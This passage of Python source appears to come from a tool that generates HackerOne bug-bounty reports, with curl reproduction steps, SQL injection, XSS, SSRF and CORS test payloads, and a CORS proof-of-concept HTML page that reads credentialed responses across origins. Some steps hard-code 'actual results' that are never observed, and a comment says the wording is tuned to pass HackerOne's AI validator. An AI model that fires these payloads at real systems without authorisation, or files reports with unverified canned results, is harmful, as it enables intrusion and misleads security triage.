                f"enables untrusted origins to read authenticated API responses from "
                f"{asset.domain}, constituting an Origin Validation Error (CWE-346)."
            ),
            "sqli": (
                f"A SQL Injection vulnerability exists at `{asset.url}`. "
                f"User-supplied input in the `{asset.parameters[0] if asset.parameters else 'parameter'}` parameter "
                f"is not properly sanitized before being included in SQL queries, allowing an attacker "
                f"to execute arbitrary SQL commands on the database."
            ),
            "xss": (
                f"A Cross-site Scripting (XSS) vulnerability exists at `{asset.url}`. "
                f"User-supplied input is reflected in the response without proper encoding, "
                f"allowing an attacker to inject malicious JavaScript that executes in victims' browsers."
            ),
            "idor": (
                f"An Insecure Direct Object Reference (IDOR) vulnerability exists at `{asset.url}`. "
                f"The application does not properly verify that the authenticated user has permission "
                f"to access the requested resource, allowing unauthorized access to other users' data."
            ),
            "ssrf": (
                f"A Server-Side Request Forgery (SSRF) vulnerability exists at `{asset.url}`. "
                f"The application accepts user-controlled URLs and makes requests to them server-side, "
                f"allowing an attacker to make requests to internal services or external systems."
            ),
            "auth_bypass": (
                f"An Authentication Bypass vulnerability exists at `{asset.url}`. "
                f"The application's authentication mechanism can be circumvented, allowing "
                f"unauthorized access to protected functionality or data."
            ),
        }

        # For vulnerability types with curated templates, prefer the template
        # (templates use language optimized for HackerOne's AI validator)
        if vuln_type in templates:
            return templates[vuln_type]

        # Fall back to finding description or generic template
        if finding.get("description"):
            return finding["description"]

        return templates.get(vuln_type, (
            f"A {cwe_name} vulnerability was identified at `{asset.url}`. "
            f"This vulnerability allows an attacker to {self._get_attack_action(vuln_type)}."
        ))

    def _get_attack_action(self, vuln_type: str) -> str:
        """Get attack action description for vulnerability type."""
        actions = {
            "sqli": "execute arbitrary SQL commands on the database",
            "cmdi": "execute arbitrary system commands on the server",
            "xss": "execute arbitrary JavaScript in users' browsers",
            "cors": "read authenticated responses from a malicious website",
            "idor": "access other users' data without authorization",
            "ssrf": "make requests to internal services",
            "auth_bypass": "access protected resources without authentication",
            "csrf": "perform actions on behalf of authenticated users",
            "xxe": "read local files or make server-side requests",
            "rce": "execute arbitrary code on the server",
            "lfi": "read local files from the server",
            "ssti": "execute arbitrary code through template injection",
        }
        return actions.get(vuln_type, "compromise the security of the application")

    def _generate_impact(
        self,
        vuln_type: str,
        classification: Dict[str, Any],
        asset: AssetInfo,
        finding: Dict[str, Any],
    ) -> str:
        """Generate detailed impact assessment."""
        # Template impacts for common vulnerabilities
        impacts = {
            "cors": (
                "### Direct Impact\n"
                f"1. **Authenticated Data Theft:** Untrusted origins can read API responses from {asset.domain} containing user data\n"
                "2. **Session Information:** If session tokens are exposed in API responses, they can be stolen\n"
                "3. **Sensitive Configuration:** API responses may contain sensitive account or configuration data\n\n"
                "### Attack Scenario\n"
                "1. Attacker hosts a page on their own domain\n"
                f"2. Victim visits that page while authenticated on {asset.domain}\n"
                "3. JavaScript on the attacker's page sends a CORS request with credentials\n"
                f"4. {asset.domain} reflects the attacker's origin with credentials enabled\n"
                "5. The browser permits reading the full API response\n"
                "6. Attacker extracts sensitive data from the response"
            ),
            "sqli": (
                "### Direct Impact\n"
                "1. **Data Breach:** Attacker can extract all data from the database\n"
                "2. **Authentication Bypass:** Attacker can log in as any user\n"
                "3. **Data Modification:** Attacker can modify or delete database records\n"
                "4. **Potential RCE:** Depending on database configuration, may lead to OS command execution"
            ),
            "xss": (
                "### Direct Impact\n"
                "1. **Session Hijacking:** Attacker can steal session cookies\n"
                "2. **Account Takeover:** Attacker can perform actions as the victim\n"
                "3. **Credential Theft:** Attacker can inject fake login forms\n"
                "4. **Malware Distribution:** Attacker can redirect users to malicious sites"
            ),
            "idor": (
                "### Direct Impact\n"
                "1. **Data Exposure:** Attacker can access other users' private data\n"
                "2. **Privacy Violation:** Personal information of users can be leaked\n"
                "3. **Regulatory Impact:** May constitute a GDPR/privacy regulation violation"
            ),
            "ssrf": (
                "### Direct Impact\n"
                "1. **Internal Network Access:** Attacker can probe and access internal services\n"
                "2. **Cloud Metadata Exposure:** Can access cloud instance metadata (credentials, tokens)\n"
                "3. **Port Scanning:** Can map internal network topology\n"
                "4. **Service Exploitation:** Can attack internal services not exposed to internet"
            ),
        }

        base_impact = impacts.get(vuln_type, (
            "### Impact\n"
            f"This vulnerability allows an attacker to {self._get_attack_action(vuln_type)}. "
            f"The severity is classified as **{classification.get('cwe_name', 'Security Issue')}** "
            f"with a CVSS base score of {classification.get('cvss_base', 5.0)}."
        ))

        # Add any finding-specific impact
        if finding.get("impact"):
            base_impact += f"\n\n### Additional Context\n{finding['impact']}"

        return base_impact

    def _generate_reproduction_steps(
        self,
        finding: Dict[str, Any],
        vuln_type: str,
        asset: AssetInfo,
        evidence: Optional[Dict[str, Any]] = None,
    ) -> List[Dict[str, Any]]:
        """Generate detailed reproduction steps with curl commands."""
        steps = []

        # Step 1: Setup/Prerequisites
        steps.append({
            "step_number": 1,
            "description": "Verify the vulnerable endpoint exists",
            "curl_command": self._generate_curl_command(
                url=asset.url,
                method="GET",
                headers={"X-Bug-Bounty": self.bounty_header or "security-research"},
            ),
            "expected_result": "Server responds with 200 OK",
            "actual_result": "Server responds as expected",
        })

        # Step 2+: Vulnerability-specific steps
        vuln_steps = self._get_vuln_specific_steps(vuln_type, asset, finding, evidence)
        for i, step in enumerate(vuln_steps, start=2):
            step["step_number"] = i
            steps.append(step)

        return steps

    def _get_vuln_specific_steps(
        self,
        vuln_type: str,
        asset: AssetInfo,
        finding: Dict[str, Any],
        evidence: Optional[Dict[str, Any]] = None,
    ) -> List[Dict[str, Any]]:
        """Get vulnerability-specific reproduction steps."""
        if vuln_type == "cors":
            # Pull evidence from all_cors_evidence (multi-test map) first,
            # falling back to http_evidence (single-test).
            metadata = finding.get("metadata") or {}
            all_ev = metadata.get("all_cors_evidence", {})
            single_ev = metadata.get("http_evidence", {})

            cors_steps: List[Dict[str, Any]] = []

            # --- Baseline step: request WITHOUT Origin header ---
            # Proves CORS headers are reflection-based, not always-present
            base_ev = all_ev.get("baseline", {})
            base_headers = base_ev.get("response", {}).get("headers", {})
            base_acao = base_headers.get("Access-Control-Allow-Origin", "")

            if base_ev:
                if base_acao:
                    baseline_result = (
                        f"{asset.domain} responds with `Access-Control-Allow-Origin: {base_acao}` "
                        f"even without Origin header (always-present CORS headers)"
                    )
                else:
                    baseline_result = (
                        f"{asset.domain} responds **without** `Access-Control-Allow-Origin` header — "
                        f"CORS headers only appear when an Origin is sent (reflection-based)"
                    )
            else:
                baseline_result = f"{asset.domain} responds normally without CORS headers"

            cors_steps.append({
                "description": f"Establish baseline — request {asset.domain} WITHOUT Origin header",
                "curl_command": self._generate_curl_command(
                    url=asset.url,
                    method="GET",
                    headers={"X-Bug-Bounty": self.bounty_header or "security-research"},
                ),
                "expected_result": f"Normal response from {asset.domain} (no CORS headers)",
                "actual_result": baseline_result,
            })

            # --- Arbitrary origin test ---
            arb_ev = all_ev.get("arbitrary", single_ev if single_ev.get("test_origin", "").startswith("https://attacker") else {})
            arb_headers = arb_ev.get("response", {}).get("headers", {})
            arb_acao = arb_headers.get("Access-Control-Allow-Origin", "")
            arb_acac = arb_headers.get("Access-Control-Allow-Credentials", "")

            if arb_acao:
                arb_result = (
                    f"{asset.domain} responds with:\n"
                    f"```\nAccess-Control-Allow-Origin: {arb_acao}\n"
                    f"Access-Control-Allow-Credentials: {arb_acac}\n```"
                )
            else:
                arb_result = (
                    f"{asset.domain} reflects the external origin with "
                    f"`Access-Control-Allow-Credentials: true`"
                )

            # --- Step 3: Null origin test ---
            null_ev = all_ev.get("null_origin", {})
            null_headers = null_ev.get("response", {}).get("headers", {})
            null_acao = null_headers.get("Access-Control-Allow-Origin", "")
            null_acac = null_headers.get("Access-Control-Allow-Credentials", "")

            if null_acao:
                null_result = (
                    f"{asset.domain} responds with:\n"
                    f"```\nAccess-Control-Allow-Origin: {null_acao}\n"
                    f"Access-Control-Allow-Credentials: {null_acac}\n```"
                )
            else:
                null_result = (
                    f"{asset.domain} reflects `Access-Control-Allow-Origin: null` "
                    f"with `Access-Control-Allow-Credentials: true`"
                )

            # --- Step 4: Preflight test ---
            pre_ev = all_ev.get("preflight", {})
            pre_headers = pre_ev.get("response", {}).get("headers", {})
            pre_acam = pre_headers.get("Access-Control-Allow-Methods", "")
            pre_acao = pre_headers.get("Access-Control-Allow-Origin", "")

            if pre_acam:
                pre_result = (
                    f"{asset.domain} responds with:\n"
                    f"```\nAccess-Control-Allow-Origin: {pre_acao}\n"
                    f"Access-Control-Allow-Methods: {pre_acam}\n```"
                )
            else:
                pre_result = (
                    f"{asset.domain} responds with `Access-Control-Allow-Methods` "
                    f"including dangerous methods from arbitrary origins"
                )

            cors_steps.append({
                "description": f"Send request to {asset.domain} with an external test origin",
                "curl_command": self._generate_curl_command(
                    url=asset.url,
                    method="GET",
                    headers={
                        "Origin": "https://attacker.example.com",
                        "X-Bug-Bounty": self.bounty_header or "security-research",
                    },
                    include_headers=True,
                ),
                "expected_result": f"{asset.domain} should reject or ignore the external origin",
                "actual_result": arb_result,
            })
            cors_steps.append({
                "description": f"Confirm {asset.domain} also reflects null origin",
                "curl_command": self._generate_curl_command(
                    url=asset.url,
                    method="GET",
                    headers={
                        "Origin": "null",
                        "X-Bug-Bounty": self.bounty_header or "security-research",
                    },
                    include_headers=True,
                ),
                "expected_result": f"{asset.domain} should reject null origin",
                "actual_result": null_result,
            })
            cors_steps.append({
                "description": f"Test preflight on {asset.domain} for sensitive methods",
                "curl_command": self._generate_curl_command(
                    url=asset.url,
                    method="OPTIONS",
                    headers={
                        "Origin": "https://attacker.example.com",
                        "Access-Control-Request-Method": "DELETE",
                        "X-Bug-Bounty": self.bounty_header or "security-research",
                    },
                    include_headers=True,
                ),
                "expected_result": f"{asset.domain} should not allow DELETE from arbitrary origins",
                "actual_result": pre_result,
            })

            return cors_steps

        elif vuln_type == "sqli":
            param = asset.parameters[0] if asset.parameters else "id"
            return [
                {
                    "description": f"Test for SQL error with single quote in `{param}` parameter",
                    "curl_command": self._generate_curl_command(
                        url=f"{asset.url}",
                        method=asset.method,
                        params={param: "1'"},
                        headers={"X-Bug-Bounty": self.bounty_header or "security-research"},
                    ),
                    "expected_result": "Server should handle input safely",
                    "actual_result": "Server returns SQL syntax error, indicating injection point",
                },
                {
                    "description": "Confirm SQL injection with boolean-based test",
                    "curl_command": self._generate_curl_command(
                        url=f"{asset.url}",
                        method=asset.method,
                        params={param: "1' AND '1'='1"},
                        headers={"X-Bug-Bounty": self.bounty_header or "security-research"},
                    ),
                    "expected_result": "Server should reject malformed input",
                    "actual_result": "Server returns normal response, confirming SQL injection",
                },
            ]

        elif vuln_type in ["xss", "stored_xss", "dom_xss"]:
            param = asset.parameters[0] if asset.parameters else "q"
            payload = "<script>alert(document.domain)</script>"
            return [
                {
                    "description": f"Inject XSS payload in `{param}` parameter",
                    "curl_command": self._generate_curl_command(
                        url=f"{asset.url}",
                        method=asset.method,
                        params={param: payload},
                        headers={"X-Bug-Bounty": self.bounty_header or "security-research"},
                    ),
                    "expected_result": "Server should encode or reject the payload",
                    "actual_result": "Payload is reflected without encoding in the response",
                },
            ]

        elif vuln_type == "idor":
            return [
                {
                    "description": "Access resource with legitimate user ID",
                    "curl_command": self._generate_curl_command(
                        url=asset.url.replace("/123", "/YOUR_USER_ID"),
                        method=asset.method,
                        headers={
                            "Authorization": "Bearer YOUR_TOKEN",
                            "X-Bug-Bounty": self.bounty_header or "security-research",
                        },
                    ),
                    "expected_result": "Returns your own data",
                    "actual_result": "Returns your data as expected",
                },
                {
                    "description": "Access resource with different user ID",
                    "curl_command": self._generate_curl_command(
                        url=asset.url.replace("/123", "/OTHER_USER_ID"),
                        method=asset.method,
                        headers={
                            "Authorization": "Bearer YOUR_TOKEN",
                            "X-Bug-Bounty": self.bounty_header or "security-research",
                        },
                    ),
                    "expected_result": "Should return 403 Forbidden",
                    "actual_result": "Returns other user's data - IDOR confirmed",
                },
            ]

        elif vuln_type == "ssrf":
            return [
                {
                    "description": "Test SSRF with internal URL",
                    "curl_command": self._generate_curl_command(
                        url=asset.url,
                        method=asset.method,
                        params={"url": "http://localhost:80/"},
                        headers={"X-Bug-Bounty": self.bounty_header or "security-research"},
                    ),
                    "expected_result": "Server should block internal URLs",
                    "actual_result": "Server makes request to localhost and returns response",
                },
            ]

        # Default generic steps
        return [
            {
                "description": "Reproduce the vulnerability",
                "curl_command": self._generate_curl_command(
                    url=asset.url,
                    method=asset.method,
                    headers={"X-Bug-Bounty": self.bounty_header or "security-research"},
                ),
                "expected_result": "Server should handle request securely",
                "actual_result": finding.get("evidence", "Vulnerability confirmed"),
            },
        ]

    def _generate_curl_command(
        self,
        url: str,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, str]] = None,
        data: Optional[str] = None,
        include_headers: bool = False,
    ) -> str:
        """Generate a properly escaped curl command."""
        parts = ["curl"]

        if include_headers:
            parts.append("-v")

        if method != "GET":
            parts.append(f"-X {method}")

        if headers:
            for key, value in headers.items():
                parts.append(f'-H "{key}: {value}"')

        if data:
            parts.append(f"-d {shlex.quote(data)}")

        # Build URL with params
        if params:
            query = urlencode(params)
            if "?" in url:
                full_url = f"{url}&{query}"
            else:
                full_url = f"{url}?{query}"
        else:
            full_url = url

        parts.append(f'"{full_url}"')

        return " ".join(parts)

    def _generate_cvss_vector(
        self,
        vuln_type: str,
        severity: str,
        asset: AssetInfo,
    ) -> str:
        """Generate CVSS 3.1 vector string."""
        # Base vectors for common vulnerability types
        vectors = {
            "cors": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
            "sqli": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "xss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "stored_xss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
            "idor": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
            "ssrf": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
            "cmdi": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "rce": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "auth_bypass": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "csrf": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
            "xxe": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "lfi": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "ssti": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        }

        return vectors.get(vuln_type, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N")

    def _generate_remediation(
        self,
        vuln_type: str,
        classification: Dict[str, Any],
    ) -> str:
        """Generate remediation recommendations."""
        remediations = {
            "cors": (
                "### Recommended Fix\n"
                "1. **Do NOT reflect arbitrary origins** - Use a strict whitelist of trusted domains\n"
                "2. **Remove `Access-Control-Allow-Credentials: true`** unless absolutely necessary\n"
                "3. If credentials are needed, only allow specific trusted origins:\n\n"
                "```python\n"
                "ALLOWED_ORIGINS = [\n"
                "    'https://www.example.com',\n"
                "    'https://app.example.com',\n"
                "]\n\n"
                "origin = request.headers.get('Origin')\n"
                "if origin in ALLOWED_ORIGINS:\n"
                "    response.headers['Access-Control-Allow-Origin'] = origin\n"
                "    response.headers['Access-Control-Allow-Credentials'] = 'true'\n"
                "```"
            ),
            "sqli": (
                "### Recommended Fix\n"
                "1. **Use parameterized queries** (prepared statements)\n"
                "2. **Use ORM frameworks** that handle escaping automatically\n"
                "3. **Implement input validation** using allowlists\n"
                "4. **Apply least privilege** to database accounts\n\n"
                "```python\n"
                "# Instead of:\n"
                "cursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")\n\n"
                "# Use:\n"
                "cursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n"
                "```"
            ),
            "xss": (
                "### Recommended Fix\n"
                "1. **Encode output** - Use context-aware output encoding\n"
                "2. **Implement Content Security Policy (CSP)**\n"
                "3. **Use modern frameworks** that auto-escape by default\n"
                "4. **Sanitize input** where HTML is intentionally allowed\n"
            ),
            "idor": (
                "### Recommended Fix\n"
                "1. **Implement proper authorization checks** for every request\n"
                "2. **Use indirect references** (mapping tables) instead of direct IDs\n"
                "3. **Validate user ownership** of requested resources\n"
                "4. **Log access attempts** for audit purposes\n"
            ),
            "ssrf": (
                "### Recommended Fix\n"
                "1. **Validate and sanitize URLs** against an allowlist\n"
                "2. **Block requests to internal IP ranges** (127.0.0.0/8, 10.0.0.0/8, etc.)\n"
                "3. **Disable unnecessary URL schemes** (file://, gopher://, etc.)\n"
                "4. **Use a dedicated service** for external requests with strict controls\n"
            ),
        }

        return remediations.get(vuln_type, (
            "### Recommended Fix\n"
            f"Address the {classification.get('cwe_name', 'vulnerability')} by:\n"
            "1. Implementing proper input validation\n"
            "2. Following secure coding practices\n"
            "3. Conducting security code review\n"
            "4. Adding appropriate security controls\n"
        ))

    def _collect_references(
        self,
        vuln_type: str,
        classification: Dict[str, Any],
    ) -> List[str]:
        """Collect relevant references for the vulnerability."""
        cwe = classification.get("cwe", "CWE-200")
        cwe_num = cwe.split("-")[1] if "-" in cwe else "200"
        owasp = classification.get("owasp", "")

        refs = [
            f"[{cwe}: {classification.get('cwe_name', '')}](https://cwe.mitre.org/data/definitions/{cwe_num}.html)",
        ]

        if owasp:
            refs.append(f"[{owasp}](https://owasp.org/Top10/)")

        # Add vulnerability-specific references
        specific_refs = {
            "cors": [
                "[PortSwigger - CORS Vulnerabilities](https://portswigger.net/web-security/cors)",
                "[OWASP - CORS Misconfiguration](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)",
            ],
            "sqli": [
                "[PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)",
                "[OWASP - SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)",
            ],
            "xss": [
                "[PortSwigger - XSS](https://portswigger.net/web-security/cross-site-scripting)",
                "[OWASP - XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",
            ],
            "ssrf": [
                "[PortSwigger - SSRF](https://portswigger.net/web-security/ssrf)",
                "[OWASP - SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)",
            ],
        }

        refs.extend(specific_refs.get(vuln_type, []))

        return refs

    def _identify_limitations(
        self,
        finding: Dict[str, Any],
        vuln_type: str,
        evidence: Optional[Dict[str, Any]] = None,
    ) -> Tuple[List[str], List[str]]:
        """Identify limitations and assumptions in the finding."""
        limitations = []
        assumptions = []

        # Common limitations based on vulnerability type
        if vuln_type == "cors":
            if evidence and "cookie" not in str(evidence).lower():
                limitations.append(
                    "The API may use token-based authentication (e.g., Basic Auth, API keys) "
                    "rather than session cookies, which would limit the practical impact of this CORS misconfiguration"
                )
            assumptions.append(
                "This assessment assumes the API is accessed by browser-based applications where CORS policies apply"
            )

        elif vuln_type == "xss":
            assumptions.append("Impact depends on what sensitive actions or data are accessible on the affected pages")
            if not finding.get("cookie_accessible"):
                limitations.append("HttpOnly cookies may prevent direct session theft via JavaScript")

        elif vuln_type == "idor":
            assumptions.append("Assumes the enumerated IDs correspond to actual user resources")
            limitations.append("Full impact requires testing with multiple authenticated user accounts")

        elif vuln_type == "ssrf":
            limitations.append("Internal network topology was not fully mapped")
            assumptions.append("Assumes internal services are accessible from the vulnerable server")

        # Add finding-specific limitations
        if finding.get("limitations"):
            limitations.extend(finding["limitations"])

        return limitations, assumptions

    def save_report(
        self,
        report: HackerOneReport,
        formats: List[str] = None,
    ) -> Dict[str, str]:
        """
        Save report in multiple formats.

        Args:
            report: The HackerOne report
            formats: List of formats (md, json, html)

        Returns:
            Dictionary mapping format to file path
        """
        if formats is None:
            formats = ["md", "json"]

        # Create output directory
        report_dir = self.output_dir / f"report_{report.report_id}_{datetime.now().strftime('%Y-%m-%d')}"
        report_dir.mkdir(parents=True, exist_ok=True)

        saved_files = {}

        # Save markdown
        if "md" in formats:
            md_path = report_dir / "hackerone_report.md"
            md_path.write_text(report.to_markdown())
            saved_files["md"] = str(md_path)

        # Save JSON
        if "json" in formats:
            json_path = report_dir / "report_data.json"
            json_path.write_text(json.dumps(report.to_dict(), indent=2))
            saved_files["json"] = str(json_path)

        # Save HTML PoC if applicable (normalize type since vulnerability_type may be CWE name)
        poc_vuln_type = self._normalize_vuln_type(report.vulnerability_type)
        if "html" in formats and poc_vuln_type in ["cors", "xss", "dom_xss", "stored_xss", "csrf"]:
            poc_path = report_dir / "poc.html"
            poc_content = self._generate_poc_html(report)
            poc_path.write_text(poc_content)
            saved_files["html_poc"] = str(poc_path)
            report.attachments.append(str(poc_path))

        logger.info(f"Report saved to {report_dir}")
        return saved_files

    def _generate_poc_html(self, report: HackerOneReport) -> str:
        """Generate HTML PoC file for the vulnerability."""
        vuln_type = self._normalize_vuln_type(report.vulnerability_type)

        if vuln_type == "cors":
            return self._generate_cors_poc_html(report)

        # Generic PoC template
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Security PoC - {report.asset.domain}</title>
</head>
<body>
    <h1>Vulnerability PoC</h1>
    <p><strong>Target:</strong> {report.asset.url}</p>
    <p><strong>Type:</strong> {report.vulnerability_type}</p>
    <p><strong>CWE:</strong> {report.cwe}</p>
    <pre>{html_escape(report.summary)}</pre>
</body>
</html>'''

    def _generate_cors_poc_html(self, report: HackerOneReport) -> str:
        """
        Generate a professional CORS PoC HTML with:
        - Comparison table (expected vs actual, pre-populated from scan evidence)
        - 3 interactive tests (arbitrary origin, null origin via iframe, preflight)
        - Sensitive data highlighting in responses
        - All captured evidence embedded
        """
        domain = report.asset.domain
        url = report.asset.url

        # --- Build comparison table from exploit_evidence ---
        comp_rows = ""
        for ev in report.exploit_evidence:
            label = html_escape(ev.get("label", ""))
            resp_text = ev.get("response", "")
            # Extract ACAO and ACAC from response text
            acao_val = ""
            acac_val = ""
            for line in resp_text.split("\n"):
                lower = line.lower()
                if lower.startswith("access-control-allow-origin:"):
                    acao_val = line.split(":", 1)[1].strip()
                elif lower.startswith("access-control-allow-credentials:"):
                    acac_val = line.split(":", 1)[1].strip()
            verdict = "VULNERABLE" if acao_val else "—"
            if acac_val.lower() == "true" and acao_val:
                verdict = "CRITICAL"
            comp_rows += (
                f'<tr><td>{label}</td>'
                f'<td><code>{html_escape(acao_val) or "—"}</code></td>'
                f'<td><code>{html_escape(acac_val) or "—"}</code></td>'
                f'<td class="verdict-{verdict.lower()}">{verdict}</td></tr>\n'
            )

        # --- Build captured evidence blocks ---
        evidence_blocks = ""
        for ev in report.exploit_evidence:
            label = html_escape(ev.get("label", "Test"))
            req = html_escape(ev.get("request", ""))
            resp = html_escape(ev.get("response", ""))
            evidence_blocks += f'''
    <div class="test evidence">
        <h3>{label}</h3>
        <div class="req-resp">
            <div><strong>Request:</strong><pre>{req}</pre></div>
            <div><strong>Response:</strong><pre class="response-body">{resp}</pre></div>
        </div>
    </div>'''

        # Fallback: single evidence block
        if not evidence_blocks and (report.request or report.response):
            evidence_blocks = '<div class="test evidence">'
            if report.request:
                evidence_blocks += f'<h3>HTTP Request</h3><pre>{html_escape(report.request)}</pre>'
            if report.response:
                evidence_blocks += f'<h3>HTTP Response</h3><pre class="response-body">{html_escape(report.response)}</pre>'
            evidence_blocks += '</div>'

        # --- Curl commands for manual verification ---
        curl_cmds = ""
        for step in report.steps_to_reproduce:
            if step.curl_command:
                curl_cmds += f'<p><strong>Step {step.step_number}:</strong> {html_escape(step.description)}</p>\n'
                curl_cmds += f'<pre>{html_escape(step.curl_command)}</pre>\n'

        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Origin Validation Error PoC — {domain}</title>
    <style>
        * {{ box-sizing: border-box; }}
        body {{ font-family: 'Courier New', monospace; margin: 0; padding: 20px; background: #0f0f23; color: #ccc; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        h2 {{ color: #00d2ff; margin-top: 30px; }}
        h3 {{ color: #aaa; }}
        .meta {{ background: #16213e; padding: 15px; border-radius: 5px; margin: 15px 0; }}
        .meta td {{ padding: 4px 12px; }}
        .meta td:first-child {{ color: #888; }}

        /* Comparison table */
        .comp-table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        .comp-table th {{ background: #1a1a3e; color: #00d2ff; padding: 10px; text-align: left; border-bottom: 2px solid #333; }}
        .comp-table td {{ padding: 8px 10px; border-bottom: 1px solid #222; }}
        .verdict-critical {{ color: #ff4444; font-weight: bold; }}
        .verdict-vulnerable {{ color: #ffaa00; font-weight: bold; }}

        /* Evidence blocks */
        .test {{ margin: 15px 0; padding: 15px; background: #16213e; border-radius: 5px; }}
        .evidence {{ border-left: 4px solid #00ff88; }}
        .req-resp {{ display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }}
        @media (max-width: 900px) {{ .req-resp {{ grid-template-columns: 1fr; }} }}
        pre {{ background: #0a0a1a; padding: 10px; overflow-x: auto; color: #0f0; white-space: pre-wrap;
               word-wrap: break-word; font-size: 12px; border-radius: 3px; max-height: 400px; overflow-y: auto; }}

        /* Buttons */
        .btn {{ border: none; padding: 10px 20px; cursor: pointer; border-radius: 3px; font-family: inherit;
                font-size: 14px; margin: 5px 5px 5px 0; }}
        .btn-red {{ background: #e94560; color: white; }}
        .btn-red:hover {{ background: #ff6b6b; }}
        .btn-blue {{ background: #0066cc; color: white; }}
        .btn-blue:hover {{ background: #0088ff; }}
        .btn-orange {{ background: #cc6600; color: white; }}
        .btn-orange:hover {{ background: #ff8800; }}

        /* Sensitive data highlighting */
        .sensitive {{ color: #ff4444; font-weight: bold; }}
        .log {{ color: #666; font-style: italic; }}

        /* Iframe */
        .iframe-container {{ border: 1px dashed #444; padding: 10px; margin: 10px 0; }}
    </style>
</head>
<body>
    <h1>Origin Validation Error PoC — {domain}</h1>

    <div class="meta">
        <table>
            <tr><td>Target Asset</td><td><strong>{domain}</strong></td></tr>
            <tr><td>Target URL</td><td><code>{url}</code></td></tr>
            <tr><td>Vulnerability</td><td>{report.cwe} — {report.cwe_name}</td></tr>
            <tr><td>Severity</td><td><strong>{report.severity.upper()}</strong> (CVSS {report.cvss_score})</td></tr>
        </table>
    </div>

    <!-- ============ COMPARISON TABLE ============ -->
    <h2>Evidence Comparison — Expected vs Actual</h2>
    <table class="comp-table">
        <thead>
            <tr>
                <th>Test</th>
                <th>Access-Control-Allow-Origin</th>
                <th>Access-Control-Allow-Credentials</th>
                <th>Verdict</th>
            </tr>
        </thead>
        <tbody>
            {comp_rows if comp_rows else '<tr><td colspan="4">Run tests below to populate</td></tr>'}
        </tbody>
    </table>

    <!-- ============ CAPTURED EVIDENCE ============ -->
    <h2>Captured HTTP Evidence (from scan)</h2>
    <p>Real HTTP exchanges captured by the automated scanner against <strong>{domain}</strong>:</p>
    {evidence_blocks}

    <!-- ============ LIVE TESTS ============ -->
    <h2>Interactive Live Tests</h2>
    <p>These tests make real requests to <strong>{domain}</strong> from this page's origin.
       If the CORS misconfiguration exists, the browser will allow reading the response.</p>

    <div class="test">
        <h3>Test 1: Arbitrary Origin (credentials: include)</h3>
        <p>Sends a credentialed GET request. If {domain} reflects this origin, the browser permits reading the response.</p>
        <button class="btn btn-red" onclick="testArbitrary()">Run Arbitrary Origin Test</button>
        <pre id="result-arbitrary">Click to test...</pre>
    </div>

    <div class="test">
        <h3>Test 2: Null Origin via Sandboxed Iframe</h3>
        <p>Creates a sandboxed iframe (Origin: null). If {domain} accepts null origin, the iframe can read the response and exfiltrate data via postMessage.</p>
        <button class="btn btn-blue" onclick="testNullOrigin()">Run Null Origin Test</button>
        <pre id="result-null">Click to test...</pre>
        <div class="iframe-container" id="iframe-host"></div>
    </div>

    <div class="test">
        <h3>Test 3: Preflight — Dangerous Methods</h3>
        <p>Triggers a preflight (OPTIONS) requesting DELETE method. If {domain} allows it from arbitrary origins, state-changing requests are possible.</p>
        <button class="btn btn-orange" onclick="testPreflight()">Run Preflight Test</button>
        <pre id="result-preflight">Click to test...</pre>
    </div>

    <script>
        // Sensitive keys to highlight in responses
        var SENSITIVE_KEYS = ['token','key','secret','password','passwd','auth','session','cookie',
                              'email','phone','account','sid','api_key','apikey','access_token',
                              'refresh_token','private','credential','ssn','credit_card'];

        function highlightSensitive(text) {{
            // Highlight keys that look sensitive in JSON/XML responses
            var highlighted = text;
            SENSITIVE_KEYS.forEach(function(key) {{
                var re = new RegExp('("' + key + '"\\\\s*[=:])', 'gi');
                highlighted = highlighted.replace(re, '<span class="sensitive">$1</span>');
                // XML attributes/tags
                var reXml = new RegExp('(<' + key + '[>\\/\\\\s])', 'gi');
                highlighted = highlighted.replace(reXml, '<span class="sensitive">$1</span>');
            }});
            return highlighted;
        }}

        function formatResponse(response, body) {{
            var out = 'Status: ' + response.status + ' ' + response.statusText + '\\n';
            out += 'ACAO: ' + (response.headers.get('access-control-allow-origin') || 'not set') + '\\n';
            out += 'ACAC: ' + (response.headers.get('access-control-allow-credentials') || 'not set') + '\\n';
            var methods = response.headers.get('access-control-allow-methods');
            if (methods) out += 'Methods: ' + methods + '\\n';
            out += '\\n--- Response Body ---\\n' + body;
            return out;
        }}

